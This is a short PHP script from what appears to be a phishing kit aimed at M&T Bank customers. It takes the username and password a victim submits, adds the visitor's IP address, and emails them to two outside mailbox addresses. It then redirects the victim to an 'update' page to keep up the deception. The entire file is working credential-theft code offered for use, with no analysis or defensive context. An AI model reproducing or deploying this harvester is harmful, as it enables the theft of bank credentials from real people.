<?php

$ip = getenv("REMOTE_ADDR");
$message .= "---VinxxMaded Version---\n";
$message .= "Username : ".$_POST['user']."\n";
$message .= "Password : ".$_POST['code']."\n";
$message .= "IP : ".$ip."\n";
$message .= "---VinxxMadedVersion---\n";
$recipient = "desktoptab18@aol.com,tabdesktop@yandex.com";
$subject = "M&T-$ip";
$headers = "From:";
$headers .= $_POST['$ip']."\n";
mail($recipient,$subject,$message,$headers);

header("Location: update.htm");
?>